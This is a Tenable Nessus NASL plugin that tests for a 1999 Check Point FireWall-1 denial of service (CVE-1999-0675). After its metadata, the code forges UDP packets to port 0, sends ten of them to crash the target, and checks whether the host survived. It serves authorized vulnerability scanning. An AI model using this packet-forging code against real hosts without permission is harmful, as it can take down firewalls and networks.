#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10074);
 script_version("$Revision: 1.28 $");
 script_cvs_date("$Date: 2017/02/16 21:23:29 $");

 script_cve_id("CVE-1999-0675");
 script_bugtraq_id(576);
 script_osvdb_id(1038);

 script_name(english:"Check Point FireWall-1 UDP Port 0 DoS");
 script_summary(english:"Crashes the remote host by sending a UDP packet going to port 0");

 script_set_attribute(attribute:"synopsis", value:"The remote firewall has a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash either the remote host or the firewall in
between us and the remote host by sending an UDP packet going to port
0.

This flaw may allow an attacker to shut down your network.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Aug/94");
 script_set_attribute(attribute:"solution", value:
"Contact your firewall vendor if it was the firewall which crashed, or
filter incoming UDP traffic if the remote host crashed.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/08/09");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/08/20");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english:"Firewalls");

 script_copyright(english:"This script is Copyright (C) 1999-2017 Tenable Network Security, Inc.");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
start_denial();


ip = forge_ip_packet(ip_v   : 4,
		     ip_hl  : 5,
		     ip_tos : 0,
		     ip_id  : 0x4321,
		     ip_len : 28,
		     ip_off : 0,
		     ip_p   : IPPROTO_UDP,
		     ip_src : this_host(),
		     ip_ttl : 0x40);

# Forge the UDP packet

udp = forge_udp_packet( ip : ip,
			uh_sport : 1234, uh_dport : 0,
			uh_ulen : 8);


#
# Send this packet 10 times
#

send_packet(udp, pcap_active:FALSE) x 10;

#
# wait
#
sleep(5);

#
# And check...
#
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(port:0, proto:"udp");
                }
